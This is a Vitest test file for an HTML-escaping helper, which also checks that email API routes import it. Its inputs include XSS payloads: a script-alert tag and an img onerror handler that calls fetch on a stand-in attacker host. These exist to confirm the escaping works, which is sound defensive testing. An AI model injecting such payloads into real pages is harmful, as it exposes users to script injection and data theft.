import { describe, it, expect } from "vitest"
import { escapeHtml } from "@/lib/utils/escapeHtml"

describe("escapeHtml", () => {
	it("escapes angle brackets", () => {
		expect(escapeHtml("<script>alert('xss')</script>")).toBe(
			"&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"
		)
	})

	it("escapes ampersands", () => {
		expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry")
	})

	it("escapes double quotes", () => {
		expect(escapeHtml('"hello"')).toBe("&quot;hello&quot;")
	})

	it("escapes single quotes", () => {
		expect(escapeHtml("it's")).toBe("it&#39;s")
	})

	it("handles safe strings unchanged", () => {
		expect(escapeHtml("Bengaluru Cafe")).toBe("Bengaluru Cafe")
	})

	it("handles empty string", () => {
		expect(escapeHtml("")).toBe("")
	})

	it("escapes complex injection attempts", () => {
		const malicious = '"><img src=x onerror=fetch("attacker.com")>'
		const escaped = escapeHtml(malicious)
		expect(escaped).not.toContain("<")
		expect(escaped).not.toContain(">")
	})
})

describe("email templates use escapeHtml", () => {
	it("all email route files should import escapeHtml", async () => {
		const fs = await import("fs")
		const path = await import("path")

		const emailRoutes = [
			"app/api/email/route.ts",
			"app/api/email/approve/route.ts",
			"app/api/email/reject/route.ts",
			"app/api/email/collaborator-joined/route.ts",
		]

		for (const route of emailRoutes) {
			const filePath = path.resolve(__dirname, "../..", route)
			const content = fs.readFileSync(filePath, "utf-8")
			expect(content, `${route} should import escapeHtml`).toContain(
				"escapeHtml"
			)
		}
	})
})
